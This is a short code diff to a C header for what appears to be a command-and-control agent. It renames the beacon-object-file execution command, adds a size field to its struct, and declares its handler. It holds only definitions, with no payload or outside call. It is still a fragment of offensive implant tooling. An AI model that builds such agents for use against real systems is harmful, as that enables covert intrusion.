@@ -97,8 +97,8 @@
 #define CMD_AGENTINFO_MESSAGE 19
 #endif
 
-#ifdef INCLUDE_CMD_BOF
-#define CMD_BOF_MESSAGE 20
+#ifdef INCLUDE_CMD_EXECUTE_BOF
+#define CMD_EXECUTE_BOF_MESSAGE 20
 #endif
 
 // Typedefs used to pass args to its respective cmd
@@ -130,12 +130,13 @@ typedef struct _CMD_EXECUTE_HBIN { // Agent > Controller
 } CMD_EXECUTE_HBIN;
 #endif
 
-#ifdef INCLUDE_CMD_BOF
-typedef struct _CMD_BOF {
+#ifdef INCLUDE_CMD_EXECUTE_BOF
+typedef struct _CMD_EXECUTE_BOF {
     LPVOID args;
     int arg_size;
     PSTR path_bof;
-} CMD_BOF;
+    int path_bof_size;
+} CMD_EXECUTE_BOF;
 #endif
 
 #ifdef INCLUDE_CMD_RM
@@ -348,5 +349,8 @@ void cmd_sleep(TASK t);
 void cmd_agentinfo(TASK t);
 #endif
 
+#ifdef INCLUDE_CMD_EXECUTE_BOF
+void cmd_bof(TASK t);
+#endif
 
 #endif
